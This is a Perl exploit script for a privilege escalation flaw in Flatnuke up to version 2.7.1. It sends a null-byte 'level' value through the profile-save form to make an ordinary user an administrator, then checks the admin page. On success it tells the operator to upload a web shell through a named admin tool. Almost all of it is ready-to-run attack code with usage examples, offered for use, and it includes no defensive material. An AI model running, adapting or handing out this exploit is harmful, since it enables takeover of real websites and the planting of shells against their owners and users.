#!/usr/bin/env perl
#
# Flatnuke <= 2.7.1 (level) Privilege Escalation 0-day Exploit  
# 
# Description
# -----------
# Flatnuke contains one flaw that may allow a user to become administrator. 
# The issue is due to 'sections/none_Login/section.php' script not properly 
# sanitizing user input supplied to the "level" POST variable. GPC = Off
# Change your rights using the null byte. Dork? Find it yourself.
# -----------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# thanks to #zeroidentity chan - http://zeroidentity.org
# Aquilo,mrdotkom,p3ri0d and the other members
#
# http://www.youtube.com/watch?v=fCRkJb8H2mQ italian 
# http://www.youtube.com/watch?v=1U4KKuqdoRg english 
#
# Usage/Example
# -------------  
# perl flatnuke.pl host /path username secid
# perl flatnuke.pl localhost /flatnuke yeat 1ab8c9b8d33a4a4e1001d07af5565d22
# -------------

use LWP::UserAgent;
use IO::Socket;


our ($host,$path,$user,$secid) = @ARGV;

if (@ARGV != 4)  {
    print "Flatnuke <= 2.7.1 (level) Privilege Escalation 0-day Exploit\n";
    Usage::Exploit();
}
else {
    Flatnuke::Exploit();
}   


sub Flatnuke::Exploit()
{
    my ($ret,$lwp);
        
    $lwp = new LWP::UserAgent;
        
    $lwp->timeout(5);
    $lwp->agent('Links (2.1pre26; Linux 2.6.19-gentoo-r5 x86_64; x)');
    $lwp->default_header('Cookie' => "myforum=$user; path=$path; secid=$secid; path=$path;");
        
        $ret = $lwp->post("http://$host/$path/index.php?mod=none_Login",
                          [
                            action     => 'saveprofile',
                            user       => $user,
                            hiddenmail => 'on',
                            ava        => 'blank.png',
                            level      => "\x0010",
                          ]);  
        
    if ($ret->is_success) {
	Flatnuke::Rights();
    }   
}


sub Flatnuke::Rights()
{
    my $packet;
    my $result;
       my $socket = new IO::Socket::INET(
                                          PeerAddr => $host,
                                          PeerPort => 80,
                                          Proto    => 'tcp',
	   ) or die $!;
                                          
    $packet .= "GET /$path/index.php?mod=none_Admin HTTP/1.1\r\n";
    $packet .= "Host: $host\r\n";
    $packet .= "User-Agent: Lynx (textmode)\r\n";
    $packet .= "Referer: http://$host/$path/index.php?mod=none_Admin\r\n";
    $packet .= "Cookie: myforum=$user; path=$path; secid=$secid; path=$path;\r\n";
    $packet .= "Connection: close\r\n\r\n";
     
    $socket->send($packet);
     
    while (<$socket>) {
	$result .= $_;
    }
     
    if ($result =~ /(livello|nivel|level|niveau) 10/i) {    
	print "Exploit successful..you're admin\n";
	print "Upload a shell on: sections/none_Admin/none_tools/webadmin.php\n";
    }
    else {
	print "Exploit unsuccesful..\n";
    }    
}


sub Usage::Exploit()
{
    print "Usage: perl $0 host/path username secid\n";
    print "RunEx: perl localhost /flatnuke yeat c3e557f271a86f893e02971b38b51653\n";
    print "by staker[at]hotmail[dot]it\n";
    exit;
}        

